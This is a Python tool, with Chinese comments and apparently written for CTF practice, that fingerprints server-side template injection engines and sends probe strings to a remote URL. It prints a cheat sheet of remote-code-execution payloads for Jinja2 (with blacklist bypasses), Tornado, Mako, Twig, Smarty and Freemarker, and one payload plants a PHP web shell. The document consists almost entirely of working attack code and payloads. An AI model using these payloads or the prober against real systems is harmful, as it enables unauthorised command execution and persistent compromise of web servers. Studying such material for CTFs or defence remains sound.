# -*- coding: utf-8 -*-
"""SSTI 模板注入探测与利用(补充题型: Web/SSTI)

用途:
    1) 引擎指纹探测: 用 {{7*7}}/${7*7}/<%= 7*7 %> 等特征判断 Jinja2/Twig/Smarty/Mako/Tornado/ERB
    2) 常用 RCE payload 速查(基于 PayloadsAllTheThings 整理思路):
       - Jinja2:  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
       - Jinja2 绕过黑名单: 用 .__getattribute__ / attr() / request 变量拆分

用法:
    python ssti_probe.py                    # 自测 + 打印 payload 速查表
    python ssti_probe.py --url http://t/x --param name   # 探测远程目标
"""
import argparse
import sys

PROBES = [  # (探测串, 引擎特征, 说明)
    ('{{7*7}}', '49', 'Jinja2 / Twig / (Jinja-like)'),
    ('{7*7}', '49', 'Smarty( Smarty 用 {math} 也行 )'),
    ('${7*7}', '49', 'Freemarker / Velocity / Mako(${expr})'),
    ('<%= 7*7 %>', '49', 'ERB / ejs'),
    ('#{7*7}', '49', 'Ruby Slim / Thymeleaf#{expr}'),
    ('{{7*7}}', '{49}', 'Jinja2 原样输出判断可再对比 {7*7}'),
    ('{{7*\'7\'}}', '7777777', 'Jinja2 特征(重复字符串)'),
    ('<%= 7*7 %>', '49', 'ERB'),
]

RCE_PAYLOADS = {
    'Jinja2 常规': "{{ c.__init__.__globals__.os.popen('id').read() }}".replace('c', 'config'),
    'Jinja2 request 拆分(绕 config 黑名单)':
        "{{ request.__class__.__mro__[1].__subclasses__() }}",  # 先枚举子类再定位 os._wrap_close
    'Jinja2 lipsum':
        "{{ lipsum.__globals__.os.popen('id').read() }}",
    'Jinja2 字符串绕过(拆关键字)':
        "{{ ''['__cl'+'ass__'].__mro__[1]['__subcl'+'asses__']() }}",
    'Tornado': "{{ handler.application.settings.__init__.__globals__.os.popen('id').read() }}",
    'Mako': "${__import__('os').popen('id').read()}",
    'Twig': "{{['id']|map('system')|join}}",
    'Smarty': "{Smarty_Internal_Write_File::writeFile($smarty.template,'<?php system($_GET[\"cmd\"]); ?>',self)}",
    'Jinjava/Freemarker': "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
}


def probe_remote(url: str, param: str, timeout: float = 10.0):
    """对远程目标逐个注入探测串并比对回显。"""
    import requests
    hits = []
    for payload, marker, engine in PROBES:
        try:
            r = requests.get(url, params={param: payload}, timeout=timeout)
            if marker in r.text:
                hits.append((engine, payload, marker))
        except Exception as e:
            print(f'[!] 请求失败 {url}: {e}')
            break
    for engine, payload, marker in hits:
        print(f'[+] 命中引擎特征: {engine}  payload={payload}  marker={marker}')
    if not hits:
        print('[-] 未命中任何特征, 尝试把探测串放进 POST/body 或换注入点')
    return hits


def main():
    ap = argparse.ArgumentParser(description='SSTI 探测与 payload 速查')
    ap.add_argument('--url')
    ap.add_argument('--param', default='name')
    ap.add_argument('--list', action='store_true', help='只打印 payload 速查表')
    args = ap.parse_args()

    if args.url:
        probe_remote(args.url, args.param)
        return
    if args.list:
        for k, v in RCE_PAYLOADS.items():
            print(f'--- {k} ---\n{v}\n')
        return
    # 自测: 本地模拟三种引擎回显验证探测逻辑
    fake_servers = {
        'jinja2': lambda p: str(eval(p.strip('{}')) if p.startswith('{{') and p.endswith('}}') else p),
        'erb': lambda p: str(eval(p.strip('<>%='))) if p.startswith('<%') else p,
        'plain': lambda p: p,
    }
    # 独立期望表(原版用与探测完全相同的循环算期望值, 断言恒真、无验证力)
    expect_map = {
        'jinja2': 'Jinja2 / Twig / (Jinja-like)',
        'erb': 'ERB / ejs',
        'plain': None,
    }
    for engine, render in fake_servers.items():
        hit = None
        for payload, marker, eng in PROBES:
            try:
                if marker in render(payload):
                    hit = eng
                    break
            except Exception:
                continue
        expect = expect_map.get(engine)
        s = 'OK' if hit == expect else 'FAIL'
        print(f'[{s}] {engine}: 探测到 {hit}')
    print()
    for k, v in RCE_PAYLOADS.items():
        print(f'--- {k} ---\n{v}\n')
    sys.exit(0)


if __name__ == '__main__':
    main()
